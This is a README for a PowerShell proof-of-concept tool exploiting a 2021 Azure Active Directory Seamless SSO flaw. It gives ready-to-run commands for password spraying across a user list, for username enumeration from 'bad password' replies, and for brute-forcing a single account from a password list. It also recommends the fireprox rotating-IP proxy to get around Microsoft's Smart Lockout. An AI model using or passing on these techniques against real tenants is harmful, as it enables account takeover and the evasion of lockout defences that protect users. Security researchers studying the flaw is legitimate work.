# aad-sso-enum-brute-spray
POC of SecureWorks' recent Azure Active Directory password brute-forcing vuln


## Description

This code is a proof-of-concept of the recently revealed Azure Active Directory password brute-forcing vulnerability [announced by Secureworks](https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/).

## Use

Basic usage is simple:  

### Password spraying

```
.\aad-sso-enum-brute-spray.ps1 USERNAME PASSWORD
```

Calling the code in this way will allow you to get the result for the specified username and password.

By taking advantage of foreach, you can easily leverage this for password spraying:

```
foreach($line in Get-Content .\all-m365-users.txt) {.\aad-sso-enum-brute-spray.ps1 $line Passw0rd! |Out-File -FilePath .\spray-results.txt -Append }
```

Note that using this method will require you to convert the resulting file from UTF-16 to UTF-8 if you want to work with it in Linux:

```
iconv -f UTF16 -t UTF-8 spray-results.txt >new-spray-results.txt
```

### User enumeration

If you're only interested in enumeration, just run as above for password spraying.  Any return value of "bad password" would mean you've found a valid username.

### Brute forcing

To leverage the code for brute forcing, simply iterate over the password field instead of the username field:

```
foreach($line in Get-Content .\passwords.txt) {.\aad-sso-enum-brute-spray.ps1 test.user@contoso.com $line |Out-File -FilePath .\brute-results.txt -Append }
```


## Important note
Microsoft's Smart Lockout feature will start falsely claiming that accounts are locked if you hit the API endpoint too quickly from the same IP address.  To get around this, I strongly recommend using [ustayready's fireprox](https://github.com/ustayready/fireprox) to avoid this problem.  Simply change the $url variable thus:

```
$url="https://xxxxxxx.execute-api.us-east-1.amazonaws.com/fireprox/"+$requestid
```

## Thanks
Almost all the code for this was borrowed from [Dr. Nestori Syynimaa's excellent AADInternals project](https://raw.githubusercontent.com/Gerenios/AADInternals/eade775c6cd4f8ed16bd77602e1ea12a02fe265e/KillChain_utils.ps1).
